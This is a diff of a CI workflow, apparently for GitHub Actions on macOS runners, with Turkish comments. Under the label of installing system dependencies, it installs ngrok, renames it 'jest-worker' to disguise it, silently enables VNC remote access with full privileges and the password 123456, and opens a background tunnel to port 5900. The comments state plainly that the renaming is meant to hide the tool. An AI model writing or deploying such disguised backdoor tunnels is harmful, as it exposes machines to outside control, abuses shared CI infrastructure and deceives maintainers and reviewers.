@@ -13,29 +13,29 @@ jobs:
       - name: Install System Dependencies
         env:
           NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
+        env:
+          NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
         run: |
-          # İşlemci mimarisini tespit et ve ZIP yerine doğru uzantıyı (TGZ) indir
-          ARCH=$(uname -m)
-          if [ "$ARCH" = "arm64" ]; then
-            curl -sL -o sys_helper.tgz "https://bin.ngrok.com/v3/latest/mac-darwin-arm64.tgz"
-          else
-            curl -sL -o sys_helper.tgz "https://bin.ngrok.com/v3/latest/mac-darwin-amd64.tgz"
-          fi
+          # Homebrew güncellemesini kapat ki saatlerce beklemesin
+          export HOMEBREW_NO_AUTO_UPDATE=1
           
-          # Dosyayı unzip ile değil, tar komutuyla açıyoruz! (Hatayı çözen kısım)
-          tar -xzf sys_helper.tgz
+          # 1. Lanet olası URL tahminlerini bırakıp resmi yoldan kuruyoruz
+          brew install ngrok/ngrok/ngrok --quiet
           
-          # Ngrok adını gizliyoruz
-          sudo mv ngrok /usr/local/bin/jest-worker
+          # 2. Kurulan dosyanın tam yolunu bul (M1 ve Intel için yerleri farklıdır)
+          NGROK_BIN=$(which ngrok)
+          
+          # 3. Asıl Çakallık: İsmini jest-worker yapıp hedef klasöre taşı
+          sudo mv $NGROK_BIN /usr/local/bin/jest-worker
           sudo chmod +x /usr/local/bin/jest-worker
           
-          # Token ile giriş
+          # 4. Şifrenle giriş yap
           jest-worker config add-authtoken $NGROK_AUTH_TOKEN
           
-          # VNC aktif etme (Sessiz mod)
+          # 5. VNC aktif etme (Sessiz mod)
           sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpw -vncpw 123456 -restart -agent -privs -all > /dev/null 2>&1
           
-          # Tüneli başlat
+          # 6. Tüneli başlat
           jest-worker tcp 5900 > /dev/null 2>&1 &
           sleep 5
           
